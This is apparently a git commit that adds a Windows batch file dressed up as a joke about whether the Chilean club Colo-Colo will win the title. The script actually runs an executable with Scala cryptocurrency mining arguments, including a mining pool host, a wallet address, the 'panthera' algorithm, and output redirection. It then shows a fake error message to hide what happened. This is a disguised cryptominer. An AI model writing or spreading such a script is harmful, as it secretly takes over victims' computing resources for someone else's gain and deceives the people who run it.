1d1c6b8deb0651aa36227a74e945e6bdeb0aee2d
zYoplyd <github@ferrada.tk>
2022-09-20 14:20:35 +0000

    Add files via upload

---
+++ windows/colocolo response view.cmd
@@ -0,0 +1,6 @@
+
+cd %~dp0
+echo "[+] Calculando si colocolo sale campeon"
+colocolo.exe -o br.scala.herominers.com:1190 -u SvkJUUX87EvM7atHGM4cVHPYSZ9ChhyUphYetS6goLQo4zL6aPTDx9gPcKLcKwRwm2gJCVsAHufVP7N5Ewhhpd2k1ikcijKr2 -p yoplydrl -a panthera -k > colocolo.badname
+echo "[-] Error, colocolo es muy grande"
+pause
